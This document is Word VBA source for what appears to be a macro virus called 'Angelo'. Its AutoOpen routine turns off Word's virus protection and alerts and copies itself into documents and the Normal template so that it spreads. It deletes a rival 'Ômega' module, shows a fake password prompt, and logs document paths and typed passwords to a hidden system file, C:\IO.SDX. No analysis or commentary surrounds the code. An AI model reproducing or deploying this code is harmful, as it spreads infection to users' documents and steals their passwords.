   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "Angelo"
   Sub AutoOpen()
   On Error GoTo Final

      Application.ScreenUpdating = False
      Application.DisplayAlerts = wdAlertsNone

      WordBasic.DisableAutoMacros 0
      Options.VirusProtection = False

      Application.EnableCancelKey = wdCancelDisabled

      Set ActiveDoc = ActiveDocument
      Set GlobalDoc = NormalTemplate

      DocumentInstalled = False
      GlobalInstalled = False

      For I = 1 To ActiveDocument.VBProject.VBComponents.Count
         If ActiveDocument.VBProject.VBComponents(I).Name = "Angelo" Then
            DocumentInstalled = True
         End If
      Next

      For J = 1 To NormalTemplate.VBProject.VBComponents.Count
         If NormalTemplate.VBProject.VBComponents(J).Name = "Angelo" Then
            GlobalInstalled = True
         End If
      Next

         If DocumentInstalled = False Then
            Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Angelo", Object:=wdOrganizerObjectProjectItems
            ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
            Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
            ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
         End If


         If GlobalInstalled = False Then
            Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Angelo", Object:=wdOrganizerObjectProjectItems
            Options.SaveNormalPrompt = False
            Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
            Options.SaveNormalPrompt = False
         End If

         If ActiveDocument.HasPassword = False Then GoTo Final
         PassBox.Show

         ''''

      Set ActiveDoc = ActiveDocument
      Set GlobalDoc = NormalTemplate

      DocumentInstalled = False
      GlobalInstalled = False

      For I = 1 To ActiveDocument.VBProject.VBComponents.Count
         If ActiveDocument.VBProject.VBComponents(I).Name = "Ômega" Then
            DocumentInstalled = True
         End If
      Next

      For J = 1 To NormalTemplate.VBProject.VBComponents.Count
         If NormalTemplate.VBProject.VBComponents(J).Name = "Ômega" Then
            GlobalInstalled = True
         End If
      Next

         If GlobalInstalled = True Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:="Ômega", Object:=wdOrganizerObjectProjectItems
            ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
            Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
            ActiveDoc.SaveAs FileName:=ActiveDoc.FullName, FileFormat:=wdFormatTemplate
         End If


         If DocumentInstalled = True Then
            Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:="Ômega", Object:=wdOrganizerObjectProjectItems
            Options.SaveNormalPrompt = False
            Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:="PassBox", Object:=wdOrganizerObjectProjectItems
            Options.SaveNormalPrompt = False
         End If

         If ActiveDocument.HasPassword = False Then GoTo Final
         PassBox.Show

   Final:
       End Sub
   Sub Analise()
   If PassBox.TextBox1 = "" Then
      ActiveDocument.Close
      Unload PassBox
      Else
      Grava
   End If

   End Sub
   Sub Grava()
   On Error Resume Next
   SetAttr "C:\IO.SDX", 0
   Open "C:\IO.SDX" For Append As #1
   Print #1, "Path = " + ActiveDocument.FullName
   Print #1, "Password = " + PassBox.TextBox1
   Print #1, " "
   Close #1
   SetAttr "C:\IO.SDX", 1 + 2 + 4

   Unload PassBox
   Application.DisplayAlerts = wdAlertsAll

   End Sub
